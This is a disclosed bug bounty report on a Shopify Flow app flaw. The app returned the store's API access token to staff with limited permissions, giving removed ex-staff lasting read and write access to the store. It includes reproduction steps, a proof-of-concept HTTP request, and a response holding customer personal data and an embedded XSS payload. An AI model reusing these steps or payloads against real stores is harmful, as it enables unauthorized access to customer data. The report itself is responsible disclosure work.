# Unauthenticated read and write access to ALL endpoints of a store is possible for removed staff members who had "Apps" permission

## Report Details
- **Report ID**: 700831
- **URL**: https://hackerone.com/reports/700831
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-09-24T06:54:43.745Z
- **Disclosed**: 2019-10-10T20:32:25.590Z

## Reporter
- **Username**: mariogh
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Technical Background
=====================

Shopify Apps need an [access token](https://www.shopify.com/partners/blog/17056443-how-to-generate-a-shopify-api-token) to work with the data of a store. 

Is very important to keep this token in a secure place. Quoting the [Shopify Blog](https://www.shopify.com/partners/blog/17056443-how-to-generate-a-shopify-api-token):
> (...) *this is like a password into this shop, so you’ll want to store this token in a very safe place.*

Description
=====================

To exploit this vulnerability, the store should have the [Flow app](https://apps.shopify.com/flow) installed. This report is completely unrelated to #698708. Both reports pentest the "Flow app" but they both are reporting two completely different and unrelated bugs. If one of them is fixed, the other still will exist.

I've been working very hard and paying a lot of attention to the [Flow app](https://apps.shopify.com/flow). Fully reading every line on every single javascript file it calls, every single HTTP request and response, and yes, my eyes look like raccoon eyes now.

The [Flow app](https://apps.shopify.com/flow) calls a Graph endpoint at (https://flow.shopifycloud.com/graphql) to check for information on multiple occasions, for example, when you just load the **My workflows** tab in the app. Of course, no vital information is disclosed in the responses.
{F590287}

When you click on the **Connectors** tab, it sends again a Graph request to (https://flow.shopifycloud.com/graphql) but this time asking for some "**shopInfo**":
{F590291}
The response...
██████████

Contains some interesting information:
```
(...)
id: "44828"
partnerApps: "[...]"
shopId: "10361503766"
shopifyDomain: "victim-store-mariogh.myshopify.com"
shopifyToken: "████████"
(...)
```

Taking a closer look, you can spot that the **Access Token** is being returned in the response:
 `shopifyToken: "█████████"`

What's interesting about the Flow App is that it has access to all endpoints (or almost all) of a store in order to *Turn tasks into automations so you can get back to business.*

Proof of concept
=====================
Now, let's grab the **Access Token** to get unauthorized access to anything we may want in the store, for example, retrieving all orders with the **[Shopify REST API](https://help.shopify.com/en/api/reference)**.

Let's do a GET request the `/admin/orders.json` endpoint using the **Access Token** and see what happens:
██████████

**Request Headers**
```
GET /admin/orders.json HTTP/1.1
Host: victim-store-mariogh.myshopify.com
Accept: */*
User-Agent: Mozilla/5.0 (compatible; Rigor/1.0.0; http://rigor.com)
Content-type: application/json
X-Shopify-Access-Token: ██████████
```

**Response Body**
```
{"orders":[{"id":1296963305494,"email":"█████@gmail.com","closed_at":null,"created_at":"2019-09-18T23:00:59-04:00","updated_at":"2019-09-18T23:01:00-04:00","number":6,"note":null,"token":"418591279c9de03f61deecee1fc6515d","gateway":null,"test":false,"total_price":"0.00","subtotal_price":"0.00","total_weight":0,"total_tax":"0.00","taxes_included":false,"currency":"USD","financial_status":"paid","confirmed":true,"total_discounts":"0.00","total_line_items_price":"0.00","cart_token":"","buyer_accepts_marketing":false,"name":"#1006{{this}}","referring_site":"https:\/\/victim-store-mariogh.myshopify.com\/products\/a","landing_site":"\/wallets\/checkouts.json","cancelled_at":null,"cancel_reason":null,"total_price_usd":"0.00","checkout_token":"3cc31dee80e2723f1ccd2e74a8aceb15","reference":null,"user_id":null,"location_id":null,"source_identifier":null,"source_url":null,"processed_at":"2019-09-18T23:00:58-04:00","device_id":null,"phone":null,"customer_locale":"en","app_id":580111,"browser_ip":"181.197.87.44","landing_site_ref":null,"order_number":1006,"discount_applications":[],"discount_codes":[],"note_attributes":[],"payment_gateway_names":[],"processing_method":"free","checkout_id":8239220228118,"source_name":"web","fulfillment_status":null,"tax_lines":[],"tags":"","contact_email":"████████@gmail.com","order_status_url":"https:\/\/victim-store-mariogh.myshopify.com\/10361503766\/orders\/418591279c9de03f61deecee1fc6515d\/authenticate?key=9a757912c87e29b3615d7b34650ef937","presentment_currency":"USD","total_line_items_price_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}},"total_discounts_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}},"total_shipping_price_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}},"subtotal_price_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}},"total_price_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}},"total_tax_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}},"total_tip_received":"0.0","admin_graphql_api_id":"gid:\/\/shopify\/Order\/1296963305494","line_items":[{"id":3241512992790,"variant_id":19560431026198,"title":"a","quantity":1,"sku":"a","variant_title":"","vendor":"Store Name","fulfillment_service":"manual","product_id":1992815050774,"requires_shipping":true,"taxable":true,"gift_card":false,"name":"a","variant_inventory_management":"shopify","properties":[],"product_exists":true,"fulfillable_quantity":1,"grams":0,"price":"0.00","total_discount":"0.00","fulfillment_status":null,"price_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}},"total_discount_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}},"discount_allocations":[],"admin_graphql_api_id":"gid:\/\/shopify\/LineItem\/3241512992790","tax_lines":[],"origin_location":{"id":763511799830,"country_code":"PA","province_code":"PA-8","name":"{{this}}","address1":"8080","address2":"","city":"Paitilla","zip":"Panama"}}],"shipping_lines":[{"id":821852798998,"title":"Standard","price":"0.00","code":"Standard","source":"shopify","phone":null,"requested_fulfillment_service_id":null,"delivery_category":null,"carrier_identifier":null,"discounted_price":"0.00","price_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}},"discounted_price_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}},"discount_allocations":[],"tax_lines":[]}],"billing_address":{"first_name":"Eric","address1":"1078 NE 34th St","phone":null,"city":"Oakland Park","zip":"33334","province":"Florida","country":"United States","last_name":"Mitchell","address2":"","company":null,"latitude":26.1693158,"longitude":-80.1329161,"name":"Eric Mitchell","country_code":"US","province_code":"FL"},"shipping_address":{"first_name":"Eric","address1":"1078 NE 34th St","phone":null,"city":"Oakland Park","zip":"33334","province":"Florida","country":"United States","last_name":"Mitchell","address2":"","company":null,"latitude":26.1693158,"longitude":-80.1329161,"name":"Eric Mitchell","country_code":"US","province_code":"FL"},"fulfillments":[],"client_details":{"browser_ip":"181.197.87.44","accept_language":"en-US,en;q=0.9","user_agent":"Mozilla\/5.0 (X11; Linux x86_64) AppleWebKit\/537.36 (KHTML, like Gecko) Ubuntu Chromium\/76.0.3809.100 Chrome\/76.0.3809.100 Safari\/537.36","session_hash":null,"browser_width":1427,"browser_height":708},"refunds":[],"customer":{"id":1375528943638,"email":"███████@gmail.com","accepts_marketing":false,"created_at":"2019-09-08T18:17:56-04:00","updated_at":"2019-09-18T23:00:59-04:00","first_name":"Ericxss\"\u003e\u003c!--\u003e\u003csvg\/onload=alert(document.domain)\u003e","last_name":"Mitchell","orders_count":2,"state":"disabled","total_spent":"0.00","last_order_id":1296963305494,"note":null,"verified_email":true,"multipass_identifier":null,"tax_exempt":false,"phone":null,"tags":"","last_order_name":"#1006{{this}}","currency":"USD","accepts_marketing_updated_at":"2019-09-08T22:08:53-04:00","marketing_opt_in_level":null,"admin_graphql_api_id":"gid:\/\/shopify\/Customer\/1375528943638","default_address":{"id":1430426419222,"customer_id":1375528943638,"first_name":"Eric","last_name":"Mitchell","company":null,"address1":"1078 NE 34th St","address2":"","city":"Oakland Park","province":"Florida","country":"United States","zip":"33334","phone":null,"name":"Eric Mitchell","province_code":"FL","country_code":"US","country_name":"United States","default":true}}},{"id":1296748183574,"email":"","closed_at":null,"created_at":"2019-09-17T22:45:02-04:00","updated_at":"2019-09-17T22:45:02-04:00","number":5,"note":"{{this}}","token":"f6bf4b59bac3005173ffd437dead93fd","gateway":null,"test":false,"total_price":"0.00","subtotal_price":"0.00","total_weight":0,"total_tax":"0.00","taxes_included":false,"currency":"USD","financial_status":"paid","confirmed":true,"total_discounts":"0.00","total_line_items_price":"0.00","cart_token":null,"buyer_accepts_marketing":false,"name":"#1005{{this}}","referring_site":null,"landing_site":null,"cancelled_at":null,"cancel_reason":null,"total_price_usd":"0.00","checkout_token":null,"reference":null,"user_id":30789599254,"location_id":18716786710,"source_identifier":null,"source_url":null,"processed_at":"2019-09-17T22:45:02-04:00","device_id":null,"phone":null,"customer_locale":null,"app_id":1354745,"browser_ip":null,"landing_site_ref":null,"order_number":1005,"discount_applications":[],"discount_codes":[],"note_attributes":[],"payment_gateway_names":[],"processing_method":"manual","checkout_id":null,"source_name":"shopify_draft_order","fulfillment_status":null,"tax_lines":[],"tags":"","contact_email":null,"order_status_url":"https:\/\/victim-store-mariogh.myshopify.com\/10361503766\/orders\/f6bf4b59bac3005173ffd437dead93fd\/authenticate?key=aec2b4abfb1d8ca683f5242391ce74d4","presentment_currency":"USD","total_line_items_price_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}},"total_discounts_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}},"total_shipping_price_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}},"subtotal_price_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}},"total_price_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}},"total_tax_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}},"total_tip_received":"0.0","admin_graphql_api_id":"gid:\/\/shopify\/Order\/1296748183574","line_items":[{"id":3240230354966,"variant_id":null,"title":"{{this}}","quantity":1,"sku":null,"variant_title":null,"vendor":null,"fulfillment_service":"manual","product_id":null,"requires_shipping":false,"taxable":true,"gift_card":false,"name":"{{this}}","variant_inventory_management":null,"properties":[],"product_exists":false,"fulfillable_quantity":1,"grams":0,"price":"0.00","total_discount":"0.00","fulfillment_status":null,"price_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}},"total_discount_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}},"discount_allocations":[],"admin_graphql_api_id":"gid:\/\/shopify\/LineItem\/3240230354966","tax_lines":[{"title":"ITBMS","price":"0.00","rate":0.05,"price_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}}},{"title":"ITBMS","price":"0.00","rate":0.05,"price_set":{"shop_money":{"amount":"0.00","currency_code":"USD"},"presentment_money":{"amount":"0.00","currency_code":"USD"}}}]}],"shipping_lines":[],"fulfillments":[],"refunds":[]}]}
```
We just received as a response all the orders I've created in my shopify store.

You can use the **Access Token** to get unauthorized access to read and modify everything the Flow App can read or modify even if the admin removed you from the staff. You don't need to have an account in the store.

Steps to Reproduce
=====================
1. Login to your shop as the shop owner and add a staff member with only "Apps" permission.
2. Install flow app: (https://apps.shopify.com/flow)
3. Login with the new user you added.
4. Open the **Developer Tools** in your browser, or any other tool to examine the HTTPs requests your browser is going to make.
5. Navigate to `https://[Your-Shop].myshopify.com/admin/apps/flow/connectors`
6. Filter the requests that the Flow App just made to show only the ones to the "Graph" endpoint, so you can easily find the one that asks for "**shopInfo**".
7. Grab the value inside `shopifyToken`, this is the **Access Token** the Flow App uses to interact with your store.
8. Login with the shop owner and remove the user you added
9.  The removed staff member can use the **Access Token** with the **[Shopify REST API](https://help.shopify.com/en/api/reference)** to get unauthorized access to read and modify all the information in the store, whenever he wants.

Remediation
=====================
The **Access Token** is like a password for the shop, it should be stored in a very safe place and never returned back in a response.

## Impact

**The ex-employee has access to the following personal information:**
* **Customer names**, **e-mail addresses**, **phone numbers**, **physical addresses**, **geolocations**, **IP addresses**, and browser user agents
* Shopify account physical addresses and phone numbers
* Staff account names, e-mail addresses, and phone numbers

**The ex-employee can access and modify the following store‘s data:**

* **Modify orders, transactions, and fulfillments**
* **Modify customer details and customer groups**
* **Modify products, variants, and collections**
* Read locations
* Read notifications
* Read shipping rates, countries, and provinces
* Modify draft orders
* Read fulfillment services
* Read gift cards
* **Modify admin notifications**
* Modify sales channels
* **Read users**
* Modify inventory
* Read all orders
* Read applications
* Read orders, transactions, and fulfillments
* Read customer details and customer groups
* Read products, variants, and collections
* Read draft orders
* Read admin notifications
* Read sales channels
* Read inventory
* Read order edits

## Attachments
- Screenshot_from_2019-09-24_00-41-32.png
- Screenshot_from_2019-09-24_00-49-14.png
